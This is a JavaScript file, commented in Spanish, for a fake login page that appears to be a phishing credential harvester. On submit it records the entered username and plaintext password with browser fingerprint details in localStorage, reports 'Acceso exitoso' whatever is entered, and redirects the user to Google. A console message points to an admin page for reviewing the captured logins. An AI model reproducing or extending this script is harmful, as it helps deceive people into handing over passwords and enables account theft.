// script.js - Versión mejorada
document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.getElementById('loginForm');
    
    if (loginForm) {
        loginForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const messageDiv = document.getElementById('message');
            
            if (!username || !password) {
                messageDiv.innerHTML = 'Por favor completa todos los campos';
                messageDiv.style.color = 'red';
                return;
            }
            
            messageDiv.innerHTML = 'Procesando...';
            messageDiv.style.color = 'blue';
            
            // Crear objeto con los datos
            const loginData = {
                id: Date.now(),
                username: username,
                password: password,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                url: window.location.href
            };
            
            // Guardar en localStorage
            let savedLogins = JSON.parse(localStorage.getItem('logins') || '[]');
            savedLogins.push(loginData);
            localStorage.setItem('logins', JSON.stringify(savedLogins));
            
            console.log('✅ Credenciales guardadas:', loginData);
            console.log('📊 Total guardados:', savedLogins.length);
            
            // Feedback visual
            messageDiv.innerHTML = '✅ Acceso exitoso';
            messageDiv.style.color = 'green';
            
            // Redirigir o limpiar
            setTimeout(() => {
                window.location.href = 'https://www.google.com'; // Redirige a Google
            }, 1500);
        });
    }
    
    // Función para acceder rápido al admin
    console.log('🚀 Para ver el panel de admin, ve a: admin.html');
});
